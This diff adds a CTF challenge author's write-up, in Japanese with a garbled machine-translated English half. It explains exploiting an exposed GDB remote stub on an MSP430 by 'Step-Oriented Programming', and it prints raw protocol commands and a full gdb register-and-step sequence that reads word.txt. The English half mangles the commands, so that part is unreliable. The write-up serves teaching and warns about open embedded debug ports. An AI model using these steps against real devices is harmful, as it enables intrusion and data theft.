@@ -1,0 +1,738 @@
+##Problem overview##
+
+· Spoke at CODE BLUE 2017
+  "Possibility of arbitrary code execution by Step-Oriented Programming "
+  Problems to be done with MSP 430 microcomputer.
+  Because of the problem of the previous (preliminary) change in the online qualifying and the finals tournament in 2016 (only to change the architecture)
+  Review problem.
+
+· A program that can be remotely debugged by remote connection with GDB is running.
+  However, the execution file of the program is not passed.
+
+· Because the architecture is unknown, first read the GDB protocol directly or communicate it
+  Acquire and identify architecture. (Arche MSP 430)
+  Specifically, we do the following. By using step execution successfully, even if you are not Esper
+  You can identify the arch.
+
+  * Obtain machine code using m command of GDB remote protocol.
+  * Get register value with g command of GDB remote protocol.
+  * Execute step by s command of GDB remote protocol.
+
+· If you can identify the arch, disassemble and analyze the machine language code.
+
+· Arbitrary code is executed by Step-Oriented Programming and the program is running
+  Capture the contents of the file called word.txt in the current directory
+
+· M command of Remote Serial Protocol is disabled. So change memory
+  Although it is made not to be able to do, since register values ​​can be changed by G command,
+  By repeating the program counter change and step execution, like ROP
+  Arbitrary code execution is possible.
+
+(Consideration point)
+- Phase to infer architecture by directly sending and receiving GDB protocol,
+  I want to make it a two-step problem of the phase of analysis and arbitrary program execution in GDB.
+  For this reason, the architecture does not teach, and elements of the architecture inference are included.
+
+##Connection to the server##
+
+First, connect with telnet.
+
+$ telnet micro.pwn.seccon.jp 10000
+$ T05 # b9
+
+If you issue the following as in the competition explanation, you get a response.
+
+$ echo '+ $ g # 67 +' | nc micro.pwn.seccon.jp 10000
+
+By looking at the response, it is judged that it is a GDB remote debugging protocol.
+The format of the GDB remote debug protocol is as follows.
+
+· Start with "$" and add a checksum at the end with #XX
+
+· The checksum is sandwiched between $ ~ #, and the part excluding $ and # is added with unsigned char
+
+· When receiving, return "+" as ACK. In the above example, "$ T05 # b9" was received from the server
+  First as "ACK", "+" is returned, further "$ g # 67" is transmitted and as an ACK for the response
+  Moreover, "+" is transmitted. If you do not return ACK, every time you send something the previous data
+  It will be resent and will not accept new requests
+
+· There are many commands, but representative are as follows
+  g ... Get a list of register values
+  m <addr>, <size> ... Acquire memory dump
+  s ... step execution (corresponding to gdb stepi command)
+  c ... Continue execution (equivalent to gdb continue command)
+  G <values ​​...> ... Setting register value (inverse of g command)
+  M <addr>, <size>: <values ​​...> ... Write values ​​to memory (inverse of m command)
+  D ... Detach
+
+  (Caution) However, the M command is invalid, and an error is returned.
+         This makes it very easy to inject arbitrary code when using the M command
+         Because the game balance is bad.
+         As an actual machine, there is a machine language code on the ROM so that it can not be rewritten
+         I suppose a case
+
+· There are many commands. When connecting with gdb, gdb will try various commands,
+  If the command is unsupported, use gdb's method with more major commands
+  Since it switches automatically automatically, as long as minimum commands (about the above seven) are implemented
+  It is possible to do basic operations from gdb as it is
+
+##Identify the architecture by seeing behaviors in step execution##
+
+Follow the steps below.
+
+(Executed only once)
+$ echo '+ $ g # 67 + $ s # 73 + $ g # 67 +' | nc micro.pwn.seccon.jp 10000
+(Executed twice)
+$ echo '+ $ g # 67 + $ s # 73 + $ g # 67 + $ s # 73 + $ g # 67 +' | nc micro.pwn.seccon.jp 10000
+
+When step execution is repeated, the part to be added in the register value obtained by the g command
+There is. It can be inferred that there is a value of the program counter. Actually doing as follows
+The beginning of the register list is the program counter, and in the little endian
+It can be inferred that it is becoming. Also, from the increase of the program counter, it was executed
+The instruction length of the instruction can be inferred.
+
+$ 00200000 ...
+$ 04200000 ...
+$ 76200000 ...
+$ 78200000 ...
+$ 7c200000 ...
+
+There seems to be an executable code at an address near 0x2000, so below it is 0x2000
+Get memory dump. Trying to get a large amount of dump at once
+Automatically disconnected, so divide it and get it.
+
+$ echo '+ $ m2000, 100 # ec +' | nc micro.pwn.seccon.jp 10000
+
+By repeating this while changing the address, a machine language code can be obtained.
+
+If step execution is executed more than once, the value of the program counter will change greatly
+is there. It can be inferred that a jump instruction or a return instruction has been executed.
+
+$ 00200000 ...
+$ 0 4200000 ... ← It seems there is a jump instruction or a return instruction here
+$ 76200000 ... ← Here the program counter has changed significantly
+$ 78200000 ...
+$ 7c200000 ...
+
+Check the value of the program counter before change. At that position, jump instruction or return
+It can be inferred that there is an order. Look at the machine language code of that place, and its machine language code
+Examine the architecture which is a jump instruction or return instruction.
+
+b 0 13 76 20 ...
+
+However, since it does not appear mechanically when searching by grep with cross-gcc 494 / sample,
+How to estimate this is the point of this problem.
+
+$ cd cross-gcc 494 / sample
+$ grep "b0 13" *. d
+
+→ Do not hit
+
+##Build toolchain##
+
+(binutils)
+
+Once you have identified the architecture, you can build the disassembler and obtain the acquired machine code
+Can be disassembled. After that, it searches for the point where the system call is called,
+By calling open () / read () with Step-Oriented Programming, you can copy the contents of the file
+read out.
+
+The following is an example of building a disassembler for MSP 430.
+
+$ wget -nd http://www2.kozos.jp/tools/cross-gcc494/binutils-2.28.tar.bz2
+$ tar xvJf binutils-2.28.tar.bz2
+$ cd binutils - 2.28
+$ ./configure --target = msp430 - elf - prefix = $ HOME / tools --disable - werror --disable - nls
+$ make (will it be an error?)
+$ make install
+→ ~ / tools / bin / msp 430 - elf - objdump should be installed ... but,
+   An error results in make. You can build it using cross-gcc 494 as follows.
+
+$ wget -nd http://kozos.jp/books/asm/cross-gcc494-v1.0.tgz
+$ tar xvzf cross-gcc494-v1.0.tgz
+$ cd cross-gcc494 / toolchain
+$ ./ fetch.sh
+$ ./setup.sh
+$ cd ..
+$ nano config.sh
+  → Activate below
+     install_dir = "$ HOME / cross-gcc 494"
+$ cd build
+$ ./setup-all.sh
+$ ./build-install-all.sh msp430-elf
+
+(GDB)
+
+If you connect with gdb, you do not have to send and receive GDB remote protocol directly, so it is somewhat easier
+Since it can be solved, build GDB.
+(However, since it can be solved by directly sending and receiving GDB remote protocol,
+Not required)
+
+If cross-gcc 494 is used to build binutils, GDB will also be built together
+The following work is unnecessary.
+
+Below is an example of gdb - 7.12, but not much about GDB version.
+
+$ wget -nd http://www2.kozos.jp/tools/gdb-7.12.tar.gz
+$ tar xvzf gdb-7.12.tar.gz
+$ cd gdb-7.12
+$ ./configure --target = msp430 - elf - prefix = $ HOME / tools --disable - werror --disable - nls
+$ make
+$ make install
+→ ~ / tools / bin / msp 430 - elf - gdb is installed.
+
+##Acquisition of Execution Code##
+
+Connect to the server with GDB and obtain execution code. However, this is a GDB protocol
+Since you can do it manually using the m command, using GDB is not mandatory.
+
+Use GDB that you built rather than system standard / usr / bin / gdb.
+
+$ ~ / cross-gcc494 / bin / msp430-elf-gdb
+(gdb) target remote micro.pwn.seccon.jp: 10000
+
+Once connected you can operate with GDB.
+
+Although the execution code has already been acquired as a memory dump,
+You can get the executable code in binary form and disassemble it below.
+
+(gdb) info registers
+→ From the value of the program counter, the address with the machine language code is near 0x2000 ~
+   .
+(gdb) dump binary memory dump.bin 0x2000 0x3000
+→ Obtain machine code
+→ If acquisition can not be made in time by the simple timer, acquire and combine it several times
+(gdb) dump binary memory dump.bin 0x2000 0x2400
+(gdb) dump binary memory dump.bin 0x2400 0x2800
+...
+$ cat dump? .bin> dump.bin
+
+##Analysis of execution code
+
+It converts memory dump of acquired machine code to binary format, and it is called dump.bin
+Save it in a file.
+(Since memory dump can be acquired in binary format if you can connect with gdb,
+If this conversion work is a hassle, you can postpone and build GDB first)
+
+dump.bin can be disassembled below.
+
+(MSP 430 is specified for Arche)
+$ ~ / cross-gcc494 / bin / msp430-elf-objdump -b binary -m MSP430 -D dump.bin
+
+Binary disassembly with objdump -b binary can not be done without the -m specification.
+Options that you can specify for -m will come up with objdump --help.
+
+Refer to the disassembled result and analyze the program.
+
+##Estimate how system calls are issued##
+
+Examine the system call invocation method to call open () / read ().
+
+Since there is explanation in the problem sentence that it is operating with GDB simulator,
+It can be inferred by reading the source code of MSDB430 simulator of GDB.
+
+Looking at the disassembled result, the inappropriate address is called by function call
+Are continuing in places. It can be inferred that this is the issuance of a special request to the simulator.
+When reading the source of the MSP 430 simulator of GDB, the function call to the address near 0x180
+, Since you can see that system call processing is being performed in the following part,
+By comparing, it is possible to know the system call invocation method.
+
+  if ((call_addr & ~ 0x3f) == 0x00180)
+    {
+      / * Syscall! * /
+      int syscall_num = call_addr & 0x3f;
+      int arg1 = MSP 430 _CPU (sd) -> state.regs [12];
+      int arg2 = MSP 430 _CPU (sd) -> state.regs [13];
+      int arg 3 = MSP 430 _CPU (sd) -> state.regs [14];
+      int arg4 = MSP 430 _CPU (sd) -> state.regs [15];
+
+      MSP 430 _CPU (sd) -> state.regs [12] = sim_syscall (MSP 430 _CPU (sd),
+                                                     syscall_num, arg1, arg2,
+                                                     arg3, arg4);
+      return 1;
+    }
+
+##Execution of arbitrary code##
+
+Writing to the memory has been abolished, so it can not be done.
+So you can not do things like shell code pouring.
+
+By setting the register value, rewriting the value of the program counter and executing step by step,
+Like ROP, let's run a specific code in existing execution code with a knob,
+It is possible to execute arbitrary code.
+(Or set the value to the register and write the register value to the memory as above
+ If you write by arbitrary code execution and write it in memory, you can inject arbitrary code
+ it can)
+
+By executing the following command on gdb, it is called word.txt in the current directory
+Get the flag by opening the file, reading it, and dumping the reading result
+it can.
+
+$ ~ / cross-gcc494 / bin / msp430-elf-gdb
+target remote micro.pwn.seccon.jp: 10000
+info registers
+print $ pc = 0x20de
+print $ sp = 0x2400
+print $ r12 = 0x6F77
+stepi
+print $ pc = 0x20de
+print $ sp = 0x2402
+print $ r12 = 0x6472
+stepi
+print $ pc = 0x20de
+print $ sp = 0x2404
+print $ r12 = 0x742E
+stepi
+print $ pc = 0x20de
+print $ sp = 0x2406
+print $ r12 = 0x7478
+stepi
+x / 16c 0x2400
+print $ pc = 0x201a
+print $ r12 = 0x2400
+print $ r13 = 0x0
+print $ r14 = 0x0
+stepi
+print $ pc = 0x 200e
+print $ r12 = 0x3
+print $ r13 = 0x2600
+print $ r14 = 0x20
+stepi
+x / 32c 0x2600
+
+##Solving method without using gdb##
+
+The GDB remote protocol is directly transmitted and received, and the command issued by the above gdb operation and
+If you issue an equivalent command on your own, you can solve it without using gdb.
+
+Register setting can be done with G command. As a method, register value of g command
+You can retrieve the list, overwrite the position of the register you want to change, and send it with the G command.
+
+Step execution by step i can be done with s command. Memory dump acquisition by m command
+You can do. In checksum calculation, by adding characters between $ ~ # with unsigned char
+Possible. These methods are as described above.
+
+Attach a flag acquisition sample. (See separate file)
+msp430-elf.read.rsp
+sendgdbproto.pl
+
+You can get flag by using it as follows. I verified it with FreeBSD.
+
+$ cat msp430-elf.read.rsp | ./sendgdbproto.pl | nc micro.pwn.seccon.jp 10000
+...
+RECV: + $ 534f 504973537465704f7269656e74656450726f6772616d6d696e670a000000 # 9e
+
+(It becomes a flag by converting to ASCII character in one byte unit)
+
+##What I suppose##
+
+As a problem,
+"If the embedded product's debug port had been opened carelessly,
+  What can be done there? "(From arc identification to actual exploit can be done)
+Suggesting an actual security problem.
+
+The following assumptions are made.
+
+- It is an embedded product, such as leaving behind for forgetting to close the debug port or for debugging
+  For that reason, the serial debug port has been left open
+  (Or it is normally closed but it can be activated with a special command)
+  Furthermore, the circuit of the serial port for debugging remains on the board,
+  You can access the debug port by soldering the serial connector
+  Sometimes.
+
+· If you can connect to the debug port, even if you do not know the architecture GDB remote
+  You can guess the architecture with direct protocol.
+  (And if you combine dump acquisition and step execution, it is quite accurate
+   What we can do is understood from this issue of this time)
+
+· If you can identify the arch, even if DEP is working or the execution code area is MMU or stub
+  It is guarded or it is on ROM and it is not changeable so shell code can not be injected
+  Even with the combination of program counter rewriting and step execution code like ROP
+  You can pinch it and assemble arbitrary code and execute it.
+
+· This assumes that you can access the debug port (usually the serial port)
+  So we assume that the device is not in front of the network but in front of you,
+  For example, IoT equipments that are stationary outdoors, secretly in the middle of the night
+  There is a concern that things are done.
+  Of course, once the debug port is accessed via the network, similar
+  There is a concern that it will be destroyed via the network.
+
+  (In other words, because it applies to products that are not connected to the network,
+   It is also an indication that it is not secure unless it is connected to the network)
+
+· This time we target MSP 430 of ultra low power consumption microcomputer, not 32 bit RISC microcomputer
+  I have to. Like this, even with 16-bit arch, and, of course, 8-bit arch
+  It can be attacked.
+
+##The explanation is over with this##
+
+
+--------
+■ 問題の概要
+
+・CODE BLUE 2017 で発表した
+  「Step-Oriented Programming による任意コード実行の可能性」
+  の問題をMSP430マイコンで行うもの．
+  2016年のオンライン予選と決勝大会で既出(アーキを変更しただけ)の問題のため，
+  復習的な問題．
+
+・GDBでリモート接続することでリモートデバッグが可能なプログラムが動作している．
+  ただしプログラムの実行ファイルは渡されない．
+
+・アーキが不明なので，まずはGDBプロトコルを直接読んだり通信したりして情報を
+  取得してアーキを特定する．(アーキはMSP430)
+  具体的には，以下を行う．ステップ実行をうまく使うことで，エスパーでなくても
+  アーキを特定できる．
+
+  ＊GDBリモートプロトコルのmコマンドで，機械語コードを取得する．
+  ＊GDBリモートプロトコルのgコマンドで，レジスタ値を取得する．
+  ＊GDBリモートプロトコルのsコマンドで，ステップ実行する．
+
+・アーキが特定できたら，機械語コードを逆アセンブルし解析する．
+
+・Step-Oriented Programming により任意コードを実行し，プログラムが動作している
+  カレントディレクトリの word.txt というファイルの内容を取得できたら攻略
+
+・Remote Serial Protocol のMコマンドは無効にしてある．よってメモリの変更は
+  できないようにしてあるが，Gコマンドによるレジスタ値の変更はできるので，
+  プログラムカウンタの変更とステップ実行を繰り返すことで，ROPのように
+  任意コード実行ができる．
+
+(考慮点)
+
+・GDBのプロトコルを直接送受信してアーキ推測するフェーズと，
+  GDBでの解析＆任意プログラム実行のフェーズの，２段階の問題にしたい．
+  このためアーキは教えず，アーキ推測の要素を入れる．
+
+■ サーバへの接続
+
+まず，telnetで接続する．
+
+$ telnet micro.pwn.seccon.jp 10000
+$T05#b9
+
+競技説明にあるように以下を発行すると，応答が得られる．
+
+$ echo '+$g#67+' | nc micro.pwn.seccon.jp 10000
+
+応答を見ることで，GDBリモートデバッグプロトコルだと判断する．
+GDBリモートデバッグプロトコルのフォーマットは以下．
+
+・「$」で始まり，末尾に#XXでチェックサムがつく
+
+・チェックサムは $〜# にはさまれた，$と#を除いた部分を unsigned char で加算する
+
+・受信したらACKとして「+」を返す．上の例ではサーバから「$T05#b9」を受信した
+  ACKとしてまず「+」を返し，さらに「$g#67」を送信しその応答に対するACKとして
+  また「+」を送信している．ACKを返さないと，次に何か送るたびに前のデータが
+  再送されてきて新しいリクエストを受け付けてくれない
+
+・コマンドは多数あるが，代表的なのは以下
+  g ... レジスタ値の一覧を取得
+  m<addr>,<size> ... メモリダンプの取得
+  s ... ステップ実行(gdbのstepiコマンドに相当)
+  c ... 実行継続(gdbのcontinueコマンドに相当)
+  G<values...> ... レジスタ値の設定(gコマンドの逆)
+  M<addr>,<size>:<values...> ... メモリへの値の書き込み(mコマンドの逆)
+  D ... デタッチ
+
+  (注意) ただしMコマンドは無効になっており，エラーを返すようにしてある．
+         これはMコマンドが使えると任意コード注入がものすごく簡単にできて
+         しまいゲームバランスが悪いため．
+         実機としては，ROM上に機械語コードがあって書き換えできないような
+         場合を想定している
+
+・コマンドは多数ありgdbで接続するとgdbがいろいろなコマンドを試してくるのだが，
+  コマンドが未サポートの場合はgdb側でよりメジャーなコマンドを使った方法に
+  自動的に切り替えるので，最低限のコマンド(上記７つくらい)を実装していれば
+  gdbから基本的な操作をすることはそれなりに可能
+
+■ ステップ実行で挙動を見てアーキを特定する
+
+以下でステップ実行してみる．
+
+(１回のみ実行)
+$ echo '+$g#67+$s#73+$g#67+' | nc micro.pwn.seccon.jp 10000
+(２回実行)
+$ echo '+$g#67+$s#73+$g#67+$s#73+$g#67+' | nc micro.pwn.seccon.jp 10000
+
+ステップ実行を繰り返すと，gコマンドで得られたレジスタ値の中で加算されていく部分
+がある．そこがプログラムカウンタの値だと推測できる．実際に行うと以下のように
+なっており，レジスタ一覧の先頭がプログラムカウンタであり，リトルエンディアンに
+なっていることが推測できる．またプログラムカウンタの増加ぶんから，実行された
+命令の命令長を推測できる．
+
+$00200000...
+$04200000...
+$76200000...
+$78200000...
+$7c200000...
+
+0x2000付近のアドレスに実行コードがあるようなので，以下で0x2000付近の
+メモリダンプを取得する．一度に多量のダンプを取得しようとするとタイマで
+自動切断されるので，小分けにして取得する．
+
+$ echo '+$m2000,100#ec+' | nc micro.pwn.seccon.jp 10000
+
+これをアドレスを変更しながら繰り返し行うことで，機械語コードが得られる．
+
+ステップ実行を複数回実行すると，プログラムカウンタの値が大きく変化することが
+ある．これはジャンプ命令かリターン命令が実行されたと推測できる．
+
+$00200000...
+$04200000... ← ここにジャンプ命令かリターン命令があると思われる
+$76200000... ← ここでプログラムカウンタが大きく変化している
+$78200000...
+$7c200000...
+
+変化前のプログラムカウンタの値を確認する．その位置に，ジャンプ命令かリターン
+命令があると推測できる．その場所の機械語コードを見て，その機械語コードが
+ジャンプ命令かリターン命令になっているアーキテクチャを調べる．
+
+b0 13 76 20 ...
+
+ただこれは cross-gcc494/sample で機械的に grep で検索しても出てこないので，
+これをいかに推定するかがこの問題のポイントとなる．
+
+$ cd cross-gcc494/sample
+$ grep "b0 13" *.d
+
+→ ヒットしない
+
+■ toolchainのビルド
+
+(binutils)
+
+アーキテクチャが特定できたら逆アセンブラをビルドすれば取得した機械語コードを
+逆アセンブルできる．あとはシステムコールの呼び出し箇所を探し，
+Step-Oriented Programming で open()/read() を呼び出すことでファイルの内容を
+読み出す．
+
+以下はMSP430向けの逆アセンブラのビルド例．
+
+$ wget -nd http://www2.kozos.jp/tools/cross-gcc494/binutils-2.28.tar.bz2
+$ tar xvJf binutils-2.28.tar.bz2
+$ cd binutils-2.28
+$ ./configure --target=msp430-elf --prefix=$HOME/tools --disable-werror --disable-nls
+$ make (エラーになる？)
+$ make install
+→ ~/tools/bin/msp430-elf-objdump がインストールされる...はずなのだが，
+   makeでエラーになる．以下のように cross-gcc494 を使うことでビルドできる．
+
+$ wget -nd http://kozos.jp/books/asm/cross-gcc494-v1.0.tgz
+$ tar xvzf cross-gcc494-v1.0.tgz
+$ cd cross-gcc494/toolchain
+$ ./fetch.sh
+$ ./setup.sh
+$ cd ..
+$ nano config.sh
+  → 以下を有効にする
+     install_dir="$HOME/cross-gcc494"
+$ cd build
+$ ./setup-all.sh
+$ ./build-install-all.sh msp430-elf
+
+(GDB)
+
+gdbで接続するとGDBリモートプロトコルを直接送受信しなくて済むので多少楽に
+解くことができるので，GDBをビルドする．
+(ただしGDBリモートプロトコルを直接送受信することで解くこともできるので，
+必須ではない)
+
+binutilsのビルドに cross-gcc494 を使えば，GDBもまとめてビルドされるので
+以下の作業は不要．
+
+以下は gdb-7.12 の例だが，GDBのバージョンはあまり問わない．
+
+$ wget -nd http://www2.kozos.jp/tools/gdb-7.12.tar.gz
+$ tar xvzf gdb-7.12.tar.gz
+$ cd gdb-7.12
+$ ./configure --target=msp430-elf --prefix=$HOME/tools --disable-werror --disable-nls
+$ make
+$ make install
+→ ~/tools/bin/msp430-elf-gdb がインストールされる．
+
+■ 実行コードの取得
+
+サーバにGDBで接続し，実行コードを取得する．ただしこれはGDBプロトコルの
+mコマンドを使うことで手作業でもできるので，GDBの利用は必須ではない．
+
+システム標準の/usr/bin/gdbでなく，ビルドしたGDBを利用すること．
+
+$ ~/cross-gcc494/bin/msp430-elf-gdb
+(gdb) target remote micro.pwn.seccon.jp:10000
+
+接続したらGDBで操作できる．
+
+実行コードはメモリダンプとしてすでに取得できているが，
+以下で実行コードをバイナリ形式で取得し，逆アセンブルすることができる．
+
+(gdb) info registers
+→ プログラムカウンタの値から，機械語コードがあるアドレスが0x2000〜付近である
+   ことがわかる．
+(gdb) dump binary memory dump.bin 0x2000 0x3000
+→ 機械語コードを取得する
+→ 簡易タイマにより取得が間に合わない場合には，何回かに分けて取得し結合する
+(gdb) dump binary memory dump.bin 0x2000 0x2400
+(gdb) dump binary memory dump.bin 0x2400 0x2800
+...
+$ cat dump?.bin > dump.bin
+
+■ 実行コードの解析
+
+取得した機械語コードのメモリダンプをバイナリ形式に変換して，dump.bin という
+ファイルに保存する．
+(gdbで接続できればメモリダンプをバイナリ形式で取得することができるので，
+この変換作業が面倒ならば後回しにして，GDBのビルドを先に行ってもよい)
+
+dump.bin は，以下で逆アセンブルできる．
+
+(アーキにMSP430を指定)
+$ ~/cross-gcc494/bin/msp430-elf-objdump -b binary -m MSP430 -D dump.bin
+
+objdump -b binary でのバイナリ逆アセンブルは，-m指定がないとできない．
+-mに指定できるオプションはobjdump --helpを実行すると出て来る．
+
+逆アセンブル結果を参照し，プログラムを解析する．
+
+■ システムコールの発行方法を推定する
+
+open()/read()を呼ぶためのシステムコール呼び出し方法を調べる．
+
+問題文中に，GDBのシミュレータで動作していることを説明してあるので，
+GDBのMSP430シミュレータのソースコードを読むことで推測できる．
+
+逆アセンブル結果を見ると，先頭付近に calla 命令で不適切なアドレスを関数コール
+している箇所が連続している．これがシミュレータへの特殊要求発行だと推測できる．
+GDBのMSP430シミュレータのソースを読むと，0x180付近のアドレスへの関数コールの
+際に，以下の部分でシステムコール処理を行っていることがわかるので，それらを
+照らし合わせることで，システムコール呼び出し方法を知ることができる．
+
+  if ((call_addr & ~0x3f) == 0x00180)
+    {
+      /* Syscall!  */
+      int syscall_num = call_addr & 0x3f;
+      int arg1 = MSP430_CPU (sd)->state.regs[12];
+      int arg2 = MSP430_CPU (sd)->state.regs[13];
+      int arg3 = MSP430_CPU (sd)->state.regs[14];
+      int arg4 = MSP430_CPU (sd)->state.regs[15];
+
+      MSP430_CPU (sd)->state.regs[12] = sim_syscall (MSP430_CPU (sd),
+                                                     syscall_num, arg1, arg2,
+                                                     arg3, arg4);
+      return 1;
+    }
+
+■ 任意コードの実行
+
+メモリへの書き込みは廃止してあるのでできない．
+このためシェルコード流し込みみたいなことはできない．
+
+レジスタ値を設定してプログラムカウンタの値を書き換えてステップ実行することで，
+ROPのように既存の実行コード中の特定のコードをつまみぐいで実行させて，
+任意コードを実行させることができる．
+(もしくはレジスタへの値設定を行い，レジスタ値のメモリへの書き込み処理を上記の
+ 任意コード実行により行ってメモリ上に書き込めば，任意コードを注入することも
+ できる)
+
+gdb上で以下のコマンドを実行することで，カレントディレクトリの word.txt という
+ファイルをオープンし，readし，読み込んだ結果をダンプすることでフラグを取得
+できる．
+
+$ ~/cross-gcc494/bin/msp430-elf-gdb
+target remote micro.pwn.seccon.jp:10000
+info registers
+print $pc = 0x20de
+print $sp = 0x2400
+print $r12 = 0x6F77
+stepi
+print $pc = 0x20de
+print $sp = 0x2402
+print $r12 = 0x6472
+stepi
+print $pc = 0x20de
+print $sp = 0x2404
+print $r12 = 0x742E
+stepi
+print $pc = 0x20de
+print $sp = 0x2406
+print $r12 = 0x7478
+stepi
+x/16c 0x2400
+print $pc = 0x201a
+print $r12 = 0x2400
+print $r13 = 0x0
+print $r14 = 0x0
+stepi
+print $pc = 0x200e
+print $r12 = 0x3
+print $r13 = 0x2600
+print $r14 = 0x20
+stepi
+x/32c 0x2600
+
+■ gdbを使わない解法
+
+GDBリモートプロトコルを直接送受信し，上記のgdb操作で発行しているコマンドと
+等価なコマンド発行を自前で行えば，gdbを使わずに解くことができる．
+
+レジスタの設定はGコマンドで行える．方法としては，gコマンドでレジスタ値の
+一覧を取得し，変更したいレジスタの位置を上書きしてGコマンドで送ればよい．
+
+stepiによるステップ実行は，sコマンドで行える．メモリダンプ取得はmコマンドで
+行える．チェックサム計算は，$〜#の間の文字を unsigned char で加算することで
+可能．これらの方法は前述しているとおり．
+
+フラグ取得のサンプルを添付する．(別ファイル参照)
+msp430-elf.read.rsp
+sendgdbproto.pl
+
+以下のようにして利用することで，フラグ取得できる．FreeBSDで検証した．
+
+$ cat msp430-elf.read.rsp | ./sendgdbproto.pl | nc micro.pwn.seccon.jp 10000
+...
+RECV: +$534f504973537465704f7269656e74656450726f6772616d6d696e670a000000#9e
+
+(１バイト単位でASCII文字に変換することでフラグになる)
+
+■ 想定しているもの
+
+問題としては，
+「組込み製品のデバッグポートがうかつに開きっぱなしになっていたら，
+  そこで何をされ得るか？」(アーキ特定から実際のExploitまでできてしまう)
+という実際のセキュリティ問題を示唆している．
+
+以下のようなものを想定している．
+
+・組込み製品で，デバッグポートの閉じ忘れやデバッグのために残してあるなどの
+  理由で，シリアルのデバッグポートが開きっぱなしになっていて
+  (もしくは普段は閉じているが特殊コマンドで有効化できるようになっていて)，
+  さらに基板上にデバッグ用のシリアルポートの回路が残っていて，
+  シリアルコネクタを半田付けすればデバッグポートにアクセスできたりする
+  ことがある．
+
+・デバッグポートに接続できれば，たとえアーキがわからなくてもGDBリモート
+  プロトコル直打ちでアーキ推測はできる．
+  (そしてダンプ取得とステップ実行を組み合わせれば，それはかなりの精度で
+   できることが，今回のこの問題からわかる)
+
+・アーキ特定できれば，たとえDEPが効いていたり実行コード領域がMMUやスタブで
+  ガードされていたりROM上にあって変更不可だったりしてシェルコード注入できなく
+  ても，プログラムカウンタ書き換えとステップ実行の組合せでROPのようにコードを
+  つまみぐいして，任意コードを組み立てて実行することができる．
+
+・これはデバッグポート(通常はシリアルポート)にアクセスできることを想定している
+  ので機器がネットワークの先でなく目の前にある場合を想定しているが，
+  たとえば屋外に据え置きになっているIoT機器とかでは，夜中にこっそりとこういう
+  ことをやられてしまう懸念がある．
+  もちろんネットワーク経由でデバッグポートにアクセスされてしまえば，同様の
+  ことはネットワーク経由でやられてしまう懸念がある．
+
+  (逆に言えば，ネットワークに接続されていない製品でも当てはまることなので，
+   ネットワークに繋がっていなければ安全というわけではない，という示唆でもある)
+
+・今回は32ビットRISCマイコンとかでなく超低消費電力マイコンのMSP430をターゲット
+  にしている．このように16ビットアーキや，もちろん８ビットアーキでも同様に
+  攻撃されることがあり得る．
+
+■ これで説明はおしまい
